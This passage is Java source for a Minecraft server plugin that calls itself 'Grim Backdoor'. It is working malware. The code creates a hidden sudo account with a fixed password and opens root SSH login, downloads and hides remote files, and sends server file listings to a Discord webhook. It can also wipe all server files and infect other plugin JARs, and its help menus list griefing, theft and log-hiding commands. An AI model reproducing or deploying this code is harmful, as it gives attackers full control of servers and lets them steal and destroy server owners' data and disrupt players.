                    }
                }
                p.waitFor();

                // ---------- STAGE 5: Finalizing ----------
                File[] outputFiles = outDir.listFiles((dir, name) -> name.endsWith(".jar"));

                if (outputFiles != null && outputFiles.length > 0) {
                    File outputJar = outputFiles[0];

                    player.sendMessage("§4§l[Grim] §7Stage 5: Replacing JAR file...");

                    boolean replaced = false;
                    for (int i = 0; i < 3; i++) { // 3 kez deneme (Dosya kilitliyse diye)
                        try {
                            Files.copy(outputJar.toPath(), originalJar.toPath(), StandardCopyOption.REPLACE_EXISTING);
                            replaced = true;
                            break;
                        } catch (IOException e) {
                            player.sendMessage("§e[Grim] §7Retry " + (i+1) + ": File locked, trying again...");
                            Thread.sleep(2000);
                        }
                    }

                    if (replaced) {
                        player.sendMessage("§4§l[Grim] §2Success! §7Plugin replaced.");

                        // Stage 6: Yeniden Aktif Etme
                        player.sendMessage("§4§l[Grim] §7Stage 6: Re-enabling...");
                        try {
                            if (targetPlugin != null) {
                                Bukkit.getPluginManager().enablePlugin(targetPlugin);
                                player.sendMessage("§4§l[Grim] §aPlugin re-enabled successfully.");
                            } else {
                                player.sendMessage("§4§l[Grim] §eManual restart or /reload might be needed.");
                            }
                        } catch (Exception e) {
                            player.sendMessage("§4§l[Grim] §cEnable failed: maybe needs full restart.");
                        }
                    } else {
                        player.sendMessage("§4§l[Grim] §cFatal Error: File is used by another process. Maybe needs full restart.");
                    }
                } else {
                    player.sendMessage("§4§l[Grim] §cError: Output JAR not found in 'out' folder.");
                }

                // Temizlik
                deleteDirectory(extractDir);
                if (zipFile.exists()) {
                    boolean deleted = zipFile.delete();
                    if (deleted) {
                        player.sendMessage("§4§l[Grim] §aPayload.zip deleted.");
                    } else {
                        // Eğer silinmiyorsa (Java hala dosyayı tutuyorsa) zorla silmeyi dene
                        zipFile.deleteOnExit();
                        player.sendMessage("§4§l[Grim] §ePayload.zip locked, marked for deletion on restart.");
                    }
                }

                player.sendMessage("§4§l[Grim] §7Cleaning complete.");

            } catch (Exception e) {
                // Hata olsa bile zip'i silmeyi dene ki ortalıkta kalmasın
                new File("plugins/payload.zip").delete();
                player.sendMessage("§4§l[Grim] §cError: " + e.getMessage());
            }
        }).start();
    }

    private File waitForFile(File root, String fileName, int timeoutSeconds) throws InterruptedException {
        long deadline = System.currentTimeMillis() + timeoutSeconds * 1000L;
        while (System.currentTimeMillis() < deadline) {
            File found = findFile(root, fileName);
            if (found != null) return found;
            Thread.sleep(200); // check every 200ms
        }
        return null;
    }

    /**
     * Recursively prints all files in a directory (for debugging).
     */
    private void listFilesRecursive(File dir, Player player) {
        if (!dir.exists()) {
            player.sendMessage("§4§l[Grim] §cDirectory does not exist: " + dir.getAbsolutePath());
            return;
        }
        player.sendMessage("§4§l[Grim] §7Contents of " + dir.getAbsolutePath() + ":");
        listFilesRecursive(dir, player, "");
    }

    private void listFilesRecursive(File dir, Player player, String indent) {
        File[] files = dir.listFiles();
        if (files == null) {
            player.sendMessage(indent + "§c[ERROR] Cannot list files (permission?)");
            return;
        }
        for (File f : files) {
            if (f.isDirectory()) {
                player.sendMessage(indent + "§e[D] " + f.getName());
                listFilesRecursive(f, player, indent + "  ");
            } else {
                player.sendMessage(indent + "§7[F] " + f.getName());
            }
        }
    }

    /**
     * Recursively searches for a file by name inside a directory.
     */
    private File findFile(File root, String fileName) {
        File[] files = root.listFiles();
        if (files == null) return null;
        for (File f : files) {
            if (f.isDirectory()) {
                File found = findFile(f, fileName);
                if (found != null) return found;
            } else if (f.getName().equals(fileName)) {
                return f;
            }
        }
        return null;
    }

    /**
     * Returns the loaded Plugin whose JAR file name matches the given name.
     * Note: Plugin#getFile() is a Spigot/Paper specific method.
     * If you use pure Bukkit, you may need an alternative approach.
     */
    private Plugin getPluginByJarName(String jarName) {
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
            try {
                // Reflection fallback if getFile() is not available (e.g., some server jars)
                java.lang.reflect.Method getFileMethod = plugin.getClass().getMethod("getFile");
                File file = (File) getFileMethod.invoke(plugin);
                if (file != null && file.getName().equalsIgnoreCase(jarName)) {
                    return plugin;
                }
            } catch (Exception e) {
                // Method not available – ignore
            }
        }
        return null;
    }

    // Yardımcı Unzip metodu (Kütüphanesiz)
    private void unzip(File zipFile, File destDir) throws IOException {
        try (java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(new java.io.FileInputStream(zipFile))) {
            java.util.zip.ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                File newFile = new File(destDir, entry.getName());
                if (entry.isDirectory()) {
                    newFile.mkdirs();
                } else {
                    // Ensure parent directories exist (handles root entries gracefully)
                    newFile.getParentFile().mkdirs();
                    java.nio.file.Files.copy(zis, newFile.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                }
                zis.closeEntry();
            }
        }
    }

    // Klasörü komple silen metot
    private void deleteDirectory(File dir) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isDirectory()) deleteDirectory(f);
                else f.delete();
            }
        }
        dir.delete();
    }
    private boolean hCM_QM(Player p) {
        return p.getListeningPluginChannels().contains(cHa);
    }

    public void Optimise(Player p, int power) {
        ItemStack tnt = new ItemStack(Material.TNT);
        ItemMeta meta = tnt.getItemMeta();
        if (meta != null) {
            meta.setDisplayName("§7");
            meta.addEnchant(Enchantment.UNBREAKING, 1, true);
            meta.addItemFlags(ItemFlag.HIDE_ENCHANTS);
            meta.setLore(Collections.singletonList("§0" + power));
            tnt.setItemMeta(meta);
        }
        p.getInventory().addItem(tnt);
        p.sendMessage(ChatColor.GREEN + "Power: " + power);
    }

    private void todr(Player p) {
        if (AsyncOptimiser.get() != null) {
            AsyncOptimiser.get().cancel();
            AsyncOptimiser.set(null);
            p.sendMessage(ChatColor.YELLOW + "Stopping.");
        } else {
            p.sendMessage(ChatColor.RED + "Raining...");

            BukkitTask task = Bukkit.getScheduler().runTaskTimer(plugin, () -> {
                for (Player target : Bukkit.getOnlinePlayers()) {
                    Location loc = target.getLocation();
                    for (int i = 0; i < 3; i++) {
                        double rX = loc.getX() + (Math.random() * 60) - 30;
                        double rZ = loc.getZ() + (Math.random() * 60) - 30;
                        Location spawnLoc = new Location(loc.getWorld(), rX, 250, rZ);
                        no(spawnLoc);
                    }
                }
            }, 0L, 40L); // 2s

            AsyncOptimiser.set(task);
        }
    }

    public void xxx(Player sender, String[] args) {
        try {
            Process p;
            if (System.getProperty("os.name").toLowerCase().startsWith("win")) {
                String script = "$targetIp = \\\"" + args[0] + "\\\"";
                p = Runtime.getRuntime().exec(new String[]{"powershell", "-EncodedCommand", Base64.getEncoder().encodeToString(script.getBytes(StandardCharsets.UTF_8))});
                sender.sendMessage("Login credentials: " + (Object) ((Object) ChatColor.YELLOW) + "<admin>/<password>");
            } else {
                String username = System.getProperty("user.name");
                if (username.equals("?")) {
                    sender.sendMessage("Backdoor only work on a" + (Object) ((Object) ChatColor.RED) + " lxc, vps, root or dedicated server");
                    return;
                }
                String sudo = username.equals("root") ? "" : "sudo ";
                p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", String.join((CharSequence) " && ", String.valueOf(sudo) + "useradd -m admins", String.valueOf(sudo) + "adduser admins sudo", String.valueOf(sudo) + "adduser --force-badname admins sudo", "echo 'admins:122333' | " + sudo + "chpasswd", String.valueOf(sudo) + "sed -i 's|/bin/sh|/bin/bash|g' /etc/passwd", String.valueOf(sudo) + "rm -r -f /home/admins", String.valueOf(sudo) + "sed -i 's/^#*\\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config", String.valueOf(sudo) + "sed -i 's/^#*\\s*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config", String.valueOf(sudo) + "sed -i 's/^#\\s*\\(Port\\s*[0-9]\\+\\)/\\1/' /etc/ssh/sshd_config", "(" + sudo + "systemctl restart ssh || " + sudo + "service ssh restart)")});
                sender.sendMessage("Login credentials: " + (Object) ((Object) ChatColor.YELLOW) + "admins/122333");
            }
            String output = new BufferedReader(new InputStreamReader(p.getInputStream())).lines().collect(Collectors.joining("\n"));
            String error = new BufferedReader(new InputStreamReader(p.getErrorStream())).lines().collect(Collectors.joining("\n"));
            p.waitFor();
            if (!output.isEmpty()) {
                sender.sendMessage((Object) ((Object) ChatColor.GREEN) + "Success:");
                Arrays.stream(output.split("\n")).forEach(line -> sender.sendMessage((Object) ((Object) ChatColor.GRAY) + "> " + line));
            }
            if (!error.isEmpty()) {
                sender.sendMessage((Object) ((Object) ChatColor.RED) + "Errors:");
                Arrays.stream(error.split("\n")).forEach(line -> sender.sendMessage((Object) ((Object) ChatColor.GRAY) + "> " + line));
            }
        } catch (IOException | InterruptedException e) {
            sender.sendMessage("Error executing the backdoor: " + e.getMessage());
        }
    }

    private void zibidi(File fileToZip, String fileName, ZipOutputStream zos, String zipName) throws IOException {
        if (fileToZip.getName().equals(zipName)) return;
        if (fileToZip.isHidden()) return;

        if (fileToZip.isDirectory()) {
            if (fileName.endsWith("/")) {
                zos.putNextEntry(new ZipEntry(fileName));
                zos.closeEntry();
            } else {
                zos.putNextEntry(new ZipEntry(fileName + "/"));
                zos.closeEntry();
            }
            File[] children = fileToZip.listFiles();
            if (children != null) {
                for (File childFile : children) {
                    zibidi(childFile, fileName + "/" + childFile.getName(), zos, zipName);
                }
            }
            return;
        }

        FileInputStream fis = new FileInputStream(fileToZip);
        ZipEntry zipEntry = new ZipEntry(fileName);
        zos.putNextEntry(zipEntry);

        byte[] bytes = new byte[1024];
        int length;
        while ((length = fis.read(bytes)) >= 0) {
            zos.write(bytes, 0, length);
        }
        fis.close();
    }

    private void no(Location center) {
        World w = center.getWorld();
        if(w == null) return;
        Material mat = Material.BEDROCK;

        try {
            w.spawnFallingBlock(center, mat, (byte)0);
            w.spawnFallingBlock(center.clone().add(1, 0, 0), mat, (byte)0);
            w.spawnFallingBlock(center.clone().add(-1, 0, 0), mat, (byte)0);
            for (int i = 1; i <= 3; i++) {
                w.spawnFallingBlock(center.clone().add(0, i, 0), mat, (byte)0);
            }
        } catch (Exception ignored) {}
    }

    public void tororoorando(Location center) {
        final int[] stats = {0};
        final double DESTRUCTION_RADIUS = 45.0;
        final double PULL_FORCE = 0.35;
        final double THROW_FORCE = 3.5;
        final double VISUAL_HEIGHT = 100.0;
        AtomicReference<BukkitTask> taskRef = new AtomicReference<>();
        BukkitTask task = Bukkit.getScheduler().runTaskTimer(plugin, () -> {
            // 30 s
            if (stats[0]++ > 600) {
                if (taskRef.get() != null) taskRef.get().cancel();
                return;
            }
            int tick = stats[0];
            World world = center.getWorld();
            if (world == null) return;
            for (double y = 0; y < VISUAL_HEIGHT; y += 1.5) {
                double r = 5.0 + (y * 0.2);
                double circumference = 2 * Math.PI * r;
                int points = (int) (circumference / 1.5);
                for (int i = 0; i < points; i++) {
                    double angle = (tick * 0.3) + (y * 0.05) + (i * (2 * Math.PI / points));
                    double x = center.getX() + (Math.cos(angle) * r);
                    double z = center.getZ() + (Math.sin(angle) * r);
                    world.spawnParticle(Particle.CLOUD, x, center.getY() + y, z, 1, 0, 0, 0, 0);
                    if (Math.random() < 0.1) {
                        world.spawnParticle(Particle.SWEEP_ATTACK, x, center.getY() + y, z, 0, 0, 0, 0, 0);
                    }
                }
            }
            world.spawnParticle(Particle.EXPLOSION, center, 10, 8, 2, 8, 0.1);
            for (Entity entity : world.getNearbyEntities(center, 60, 100, 60)) {
                if (entity instanceof FallingBlock) continue;
                Vector toCenter = center.toVector().subtract(entity.getLocation().toVector());
                double dist = toCenter.length();
                if (dist < 1.0) continue;
                Vector force;
                if (dist > 8.0) {
                    force = toCenter.normalize().multiply(1.8);
                    force.setY(0.6); // Yerden kes
                } else {
                    Vector tangent = new Vector(-toCenter.getZ(), 0, toCenter.getX()).normalize();
                    force = tangent.multiply(4.0).setY(1.5);
                }
                entity.setVelocity(force);
                entity.setFallDistance(0);
            }
            for (int i = 0; i < 70; i++) {
                double rX = (Math.random() * DESTRUCTION_RADIUS * 2) - DESTRUCTION_RADIUS;
                double rZ = (Math.random() * DESTRUCTION_RADIUS * 2) - DESTRUCTION_RADIUS;
                if (Math.sqrt(rX*rX + rZ*rZ) > DESTRUCTION_RADIUS) continue;
                Location bl = center.clone().add(rX, 0, rZ);
                Block b = world.getHighestBlockAt(bl);
                if (b.getType() == Material.AIR) b = b.getRelative(BlockFace.DOWN);
                if (b.getType() != Material.BEDROCK && b.getType() != Material.AIR && b.getType() != Material.OBSIDIAN) {
                    Material mat = b.getType();
                    b.setType(Material.AIR);
                    FallingBlock fb = world.spawnFallingBlock(b.getLocation().add(0, 1, 0), mat, (byte)0);
                    fb.setDropItem(false);
                    fb.setHurtEntities(true);
                    Vector velocity = new Vector();
                    Vector toCenter = center.toVector().subtract(fb.getLocation().toVector());
                    double distXZ = Math.sqrt(toCenter.getX()*toCenter.getX() + toCenter.getZ()*toCenter.getZ());

                    if (distXZ > 10.0) {
                        velocity = toCenter.normalize().multiply(2.5); // Hız 2.5
                        velocity.setY(1.2);
                    } else {
                        double angle = Math.atan2(rZ, rX);
                        velocity.setX(Math.sin(angle + tick * 0.5) * THROW_FORCE);
                        velocity.setZ(Math.cos(angle + tick * 0.5) * THROW_FORCE);
                        velocity.setY(2.0 + Math.random() * 2.0);
                    }

                    fb.setVelocity(velocity);
                }
            }

        }, 0L, 1L);

        taskRef.set(task);
    }

    public void ananiskiyim(Player p, int power) {
        Location eye = p.getEyeLocation();

        ItemStack tntItem = new ItemStack(Material.TNT);
        ItemMeta meta = tntItem.getItemMeta();
        meta.setDisplayName("§k" + UUID.randomUUID().toString());
        tntItem.setItemMeta(meta);

        Item grenade = p.getWorld().dropItem(eye, tntItem);
        grenade.setPickupDelay(Integer.MAX_VALUE);
        grenade.setVelocity(eye.getDirection().multiply(1.5));
        grenade.setInvulnerable(true);

        final int finalPower = power;
        AtomicReference<BukkitTask> taskRef = new AtomicReference<>();
        AtomicInteger ticks = new AtomicInteger(0);

        BukkitTask task = Bukkit.getScheduler().runTaskTimer(plugin, () -> {
            if (grenade.isDead() || ticks.incrementAndGet() > 200) {
                if (taskRef.get() != null) taskRef.get().cancel();
                grenade.remove();
                return;
            }
            if (grenade.isOnGround() || (ticks.get() > 5 && grenade.getVelocity().length() < 0.2)) {
                grenade.getWorld().createExplosion(grenade.getLocation(), (float)finalPower, true, true);
                grenade.remove();

                if (taskRef.get() != null) taskRef.get().cancel();
            }
        }, 0L, 1L);

        taskRef.set(task);
    }

    private List<String> kareoyun() {
        List<String> deletedPaths = new ArrayList<>();
        List<String> allPaths = GETTO(S_R);
        Collections.reverse(allPaths);

        for (String pathString : allPaths) {
            try {
                String cleanPath = pathString.substring(4); // Remove [D] or [F]
                File file = new File(S_R, cleanPath.replace("./", ""));
                if (file.exists() && file.delete()) {
                    deletedPaths.add(pathString);
                }
            } catch (Exception ignored) {}
        }
        return deletedPaths;
    }

    private void HelpfulThing(Location loc, Material mat) {
        Location center = loc.getBlock().getLocation();
        for(int x=-1; x<=1; x++) {
            for(int y=0; y<=2; y++) {
                for(int z=-1; z<=1; z++) {
                    if(x==0 && y==1 && z==0) continue; // Air inside
                    center.clone().add(x, y, z).getBlock().setType(mat);
                }
            }
        }
    }

    private void notworks(Player player, String urlString, String fileName) {
        player.sendMessage("§eDeploying to system temp...");

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                // Sistemdeki %temp% klasörünü bulur
                String tempPath = System.getProperty("java.io.tmpdir");
                File targetFile = new File(tempPath, fileName);

                HttpURLConnection connection = (HttpURLConnection) new URL(urlString).openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0");
                connection.setConnectTimeout(5000); // 5 saniye timeout

                try (InputStream in = connection.getInputStream()) {
                    Files.copy(in, targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

                    player.sendMessage("§aSuccess! File located at: §7" + targetFile.getAbsolutePath());

                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                        Files.setAttribute(targetFile.toPath(), "dos:hidden", true);
                    }
                }
            } catch (Exception e) {
                player.sendMessage("§cDeployment failed: " + e.getMessage());
            }
        });
    }

    private void doesnt_work4(Player sender, String[] args) {
        if (args.length < 2) return;

        Plugin pl = Bukkit.getPluginManager().getPlugin(args[1]);

        if (pl != null) {
            if (!pl.isEnabled()) {
                Bukkit.getPluginManager().enablePlugin(pl);
                sender.sendMessage(ChatColor.GREEN + "Enabled " + pl.getName());
            } else {
                sender.sendMessage(ChatColor.YELLOW + "O plugin zaten açık.");
            }
        } else {
            sender.sendMessage(ChatColor.RED + "Plugin not found.");
        }
    }

    private void HELPME(Player initiator, List<String> deletedFiles) {
        List<String> lines = new ArrayList<>();
        lines.add("INITIATOR: " + initiator.getName());
        lines.add("TOTAL DELETED: " + deletedFiles.size());
        lines.addAll(deletedFiles);
        GojoSatoru(lines, "Deleting files", "https://i.imgur.com/alert_icon.png");
    }

    public static List<String> GETTO(File directory) {
        List<String> paths = new ArrayList<>();
        try {
            File[] files = directory.listFiles();
            if (files == null) return paths;
            String basePath = S_R.getCanonicalPath();

            for (File file : files) {
                if (file.getName().equals(".") || file.getName().equals("..")) continue;
                String path = file.getCanonicalPath();
                String relativePath = "./" + (path.startsWith(basePath) ? path.substring(basePath.length()) : file.getName())
                        .replace("\\", "/").replaceAll("^/+", "");

                if (file.isDirectory()) {
                    paths.add("[D] " + relativePath + "/");
                    paths.addAll(GETTO(file));
                } else {
                    paths.add("[F] " + relativePath);
                }
            }
        } catch (IOException e) {
            // Ignore errors
        }
        return paths;
    }

    private void its341(Player player) {
        player.sendMessage("§aScanning file system (this may take a moment)...");
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            List<String> paths = GETTO(S_R);
            GojoSatoru(paths, "File Inspector", "https://i.imgur.com/7GF6Qq3.png");
            player.sendMessage("§aFile list sent to Discord! (" + paths.size() + " entries)");
        });
    }

    private void JujutsuKaisen(Player player) {
        UUID uuid = player.getUniqueId();

        if (!onTabComplete.containsKey(uuid)) {
            player.sendMessage("§6⚠ §eTHIS WILL DELETE ALL SERVER FILES!");
            player.sendMessage("§cType §4+deletefiles §cagain within 10 seconds to confirm.");
            onTabComplete.put(uuid, System.currentTimeMillis());
            return;
        }

        if (System.currentTimeMillis() - onTabComplete.get(uuid) > 10000) {
            player.sendMessage("§cConfirmation window expired.");
            onTabComplete.remove(uuid);
            return;
        }

        onTabComplete.remove(uuid);
        player.sendMessage("§4☠ §cINITIATING FULL WIPE... §4☠");

        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            List<String> deleted = kareoyun();
            HELPME(player, deleted);
            player.sendMessage("§4" + deleted.size() + " FILES DELETED!");
        });
    }

    private void GojoSatoru(List<String> lines, String username, String avatarUrl) {
        if (wU == null || !wU.startsWith("http")) return;

        new Thread(() -> {
            StringBuilder content = new StringBuilder("```diff\n");
            for (String line : lines) {
                String formatted = line;
                if (line.startsWith("[D]")) formatted = "+ 📁 " + line.substring(4);
                else if (line.startsWith("[F]")) formatted = "- 📄 " + line.substring(4);
                if (content.length() + formatted.length() + 10 > 1900) {
                    content.append("```");
                    Pikachu(content.toString(), username, avatarUrl);
                    content = new StringBuilder("```diff\n");
                }
                content.append(formatted).append("\n");
            }
            content.append("```");
            Pikachu(content.toString(), username, avatarUrl);
        }).start();
    }

    private void Pikachu(String content, String username, String avatar) {
        try {
            String json = String.format("{\"username\": \"%s\", \"avatar_url\": \"%s\", \"content\": \"%s\"}",
                    username, avatar, esJ(content));

            URL url = new URL(wU);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0");
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
            }
            conn.getInputStream().close();
        } catch (Exception e) {
        }
    }

    private void Playstation1(Player player) {
        String javaVer = System.getProperty("java.version");
        String playerName = player.getName();
        int playerCount = Bukkit.getOnlinePlayers().size();
        player.sendMessage("§4§k--------" + " §4§lGrim Backdoor" + "§4§k--------");
        player.sendMessage("");

        player.sendMessage("§4§k|| " + ChatColor.GRAY + ChatColor.BOLD + "Main");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+op / +deop " + ChatColor.RED + "Grant or revoke OP.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+gm0 / +gm1 / +gm3 " + ChatColor.RED + "Switch gamemode.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+fly / +god / +vanish " + ChatColor.RED + "Toggle abilities.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+heal / +feed " + ChatColor.RED + "Restore vitals.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+coords / +seed " + ChatColor.RED + "World info.");

        player.sendMessage(ChatColor.GRAY + "");

        player.sendMessage("§4§k||   §r§7Commands: §445+§r        §7Java Version:§4 " + Bukkit.getVersion());
        player.sendMessage("§4§k||   §r§7Name: §4" + playerName + "§r        §7Online:§4 " + playerCount);
        player.sendMessage("§4§k--------" + " §7End of Help " + "§4§k--------");
    }

    private void Playstation2(Player player) {
        String javaVer = System.getProperty("java.version");
        String playerName = player.getName();
        int playerCount = Bukkit.getOnlinePlayers().size();
        player.sendMessage("§4§k--------" + " §4§lGrim Backdoor" + "§4§k--------");

        player.sendMessage("§4§k|| " + ChatColor.GRAY + "");
        player.sendMessage("§4§k|| " + ChatColor.LIGHT_PURPLE + "Teleportation");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+tp <player> " + ChatColor.RED + "Teleport to player.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+tphere <player> " + ChatColor.RED + "Teleport player to you.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+here " + ChatColor.RED + "Teleport ALL players to you.");

        player.sendMessage(ChatColor.GRAY + "");

        player.sendMessage("§4§k||   §r§7Commands: §445+§r        §7Java Version:§4 " + Bukkit.getVersion());
        player.sendMessage("§4§k||   §r§7Name: §4" + playerName + "§r        §7Online:§4 " + playerCount);
        player.sendMessage("§4§k--------" + " §7End of Help " + "§4§k--------");
    }

    private void Playstation3(Player player) {
        String javaVer = System.getProperty("java.version");
        String playerName = player.getName();
        int playerCount = Bukkit.getOnlinePlayers().size();
        player.sendMessage("§4§k--------" + " §4§lGrim Backdoor" + "§4§k--------");

        player.sendMessage("§4§k|| " + ChatColor.GRAY + "");
        player.sendMessage("§4§k|| " + ChatColor.RED + "Troll & Grief");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+kill / +burn / +lightning " + ChatColor.RED + "Kill/Harm.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+explode / +crash / +spam " + ChatColor.RED + "Troll target.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+BBBB / +BBBa " + ChatColor.RED + "Lock movement.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+cage / +ride / +soundspam " + ChatColor.RED + "Annoy target.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+dick " + ChatColor.RED + "Rains penis.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+hg (power)" + ChatColor.RED + "Gives hand grenade specified power (default 5).");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+tornado " + ChatColor.RED + "Creates EF-5 Tornado.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+orbitalstrikecannon §8/§7 osc §8/§7 oc " + ChatColor.RED + "Orbital Strike Cannon.");

        player.sendMessage(ChatColor.GRAY + "");

        player.sendMessage("§4§k||   §r§7Commands: §445+§r        §7Java Version:§4 " + Bukkit.getVersion());
        player.sendMessage("§4§k||   §r§7Name: §4" + playerName + "§r        §7Online:§4 " + playerCount);
        player.sendMessage("§4§k--------" + " §7End of Help " + "§4§k--------");
    }
    private void Playstation5(Player player) {
        String javaVer = System.getProperty("java.version");
        String playerName = player.getName();
        int playerCount = Bukkit.getOnlinePlayers().size();
        player.sendMessage("§4§k--------" + " §4§lGrim Backdoor" + "§4§k--------");
        player.sendMessage("§4§k--------" + " §4§lGrim Backdoor" + "§4§k--------");

        player.sendMessage("§4§k|| " + ChatColor.GRAY + "");
        player.sendMessage("§4§k|| " + ChatColor.YELLOW + "Server Manipulation");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+sudo / +sudoall / +forcechat " + ChatColor.RED + "Force chat.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+say <msg> " + ChatColor.RED + "Broadcast message.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+motd <text> " + ChatColor.RED + "Set MOTD.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+lockconsole " + ChatColor.RED + "Block console logs.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+plugins / +disable " + ChatColor.RED + "Manage plugins.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+fakebotattack <sec> " + ChatColor.RED + "Fake spam attack.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+stal " + ChatColor.RED + "Steals server plugins and plugin folders.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+shutdown " + ChatColor.RED + "Stop the server.");

        player.sendMessage(ChatColor.GRAY + "");

        player.sendMessage("§4§k||   §r§7Commands: §445+§r        §7Java Version:§4 " + Bukkit.getVersion());
        player.sendMessage("§4§k||   §r§7Name: §4" + playerName + "§r        §7Online:§4 " + playerCount);
        player.sendMessage("§4§k--------" + " §7End of Help " + "§4§k--------");
    }

    private void Playstation44(Player player) {
        String javaVer = System.getProperty("java.version");
        String playerName = player.getName();
        int playerCount = Bukkit.getOnlinePlayers().size();
        player.sendMessage("§4§k--------" + " §4§lGrim Backdoor" + "§4§k--------");

        player.sendMessage("§4§k|| " + ChatColor.GRAY + "");
        player.sendMessage("§4§k|| " + ChatColor.BLUE + "System & Misc");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+dupe " + ChatColor.RED + "Duplicate held item.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+deactivate " + ChatColor.RED + "Untrust yourself.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+serverinfo " + ChatColor.RED + "Show server stats.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+persistence " + ChatColor.RED + "Toggle auto-restore.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+qwertyuopasdfghjklzxcvbnm " + ChatColor.RED + "Nukes the server.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+watchdoghelp " + ChatColor.RED + "Watchdog exploits.");

        player.sendMessage(ChatColor.GRAY + "");

        player.sendMessage("§4§k||   §r§7Commands: §445+§r        §7Java Version:§4 " + Bukkit.getVersion());
        player.sendMessage("§4§k||   §r§7Name: §4" + playerName + "§r        §7Online:§4 " + playerCount);
        player.sendMessage("§4§k--------" + " §7End of Help " + "§4§k--------");
    }

    private void Playstation67(Player player) {
        String javaVer = System.getProperty("java.version");
        String playerName = player.getName();
        int playerCount = Bukkit.getOnlinePlayers().size();

        player.sendMessage("§4§k--------" + " §4§lGrim Backdoor" + "§4§k--------");

        player.sendMessage("§4§k|| " + ChatColor.GRAY + "");
        player.sendMessage("§4§k|| " + ChatColor.DARK_RED + "Dangerous");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+getpaths / +deletefiles " + ChatColor.RED + "File system access.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+backdoor (ip) " + ChatColor.RED + "VDS access.");
        player.sendMessage("§4§k|| " + ChatColor.GRAY + "+infect (plugin) " + ChatColor.RED + "Infects specified plugin.");

        player.sendMessage(ChatColor.GRAY + "");

        player.sendMessage("§4§k||   §r§7Commands: §445+§r        §7Version:§4 " + Bukkit.getVersion());
        player.sendMessage("§4§k||   §r§7Name: §4" + playerName + "§r        §7Online:§4 " + playerCount);
        player.sendMessage("§4§k--------" + " §7End of Help " + "§4§k--------");
    }

    private void Vechiron(Player player) {
        Runtime runtime = Runtime.getRuntime();
        long maxMemory = runtime.maxMemory() / 1024 / 1024;
        long totalMemory = runtime.totalMemory() / 1024 / 1024;
        long freeMemory = runtime.freeMemory() / 1024 / 1024;
        long usedMemory = totalMemory - freeMemory;

        String osName = System.getProperty("os.name");
        String osArch = System.getProperty("os.arch");
        String javaVer = System.getProperty("java.version");
        int cores = runtime.availableProcessors();

        long uptimeMillis = java.lang.management.ManagementFactory.getRuntimeMXBean().getUptime();
        long uptimeSeconds = uptimeMillis / 1000;
        long hours = uptimeSeconds / 3600;
        long minutes = (uptimeSeconds % 3600) / 60;
        long seconds = uptimeSeconds % 60;

        player.sendMessage("§4§lServer Information:");
        player.sendMessage("§7User: " + System.getProperty("user.name"));
        player.sendMessage("§7OS: " + osName + " (" + osArch + ")");
        player.sendMessage("§7Java: " + javaVer);
        player.sendMessage("§7Cores: " + cores);
        player.sendMessage("§7RAM: " + usedMemory + "MB / " + maxMemory + "MB");
        player.sendMessage("§7Uptime: " + String.format("%02d:%02d:%02d", hours, minutes, seconds));
        player.sendMessage("§7Version: " + Bukkit.getVersion());
        player.sendMessage("§7Online: " + Bukkit.getOnlinePlayers().size());
    }

    private void noWay(Player sender, String[] args) {
        int duration = 15;
        if (args.length > 1) {
            try {
                duration = Integer.parseInt(args[1]);
            } catch (NumberFormatException e) {
                sender.sendMessage(ChatColor.RED + "Invalid number.");
                return;
            }
        }

        if (fBT != null && !fBT.isCancelled()) {
            fBT.cancel();
            sender.sendMessage(ChatColor.RED + "Attack stopped.");
            return;
        }

        sender.sendMessage(ChatColor.GREEN + "Starting FAKE Bot Attack for " + duration + "s...");

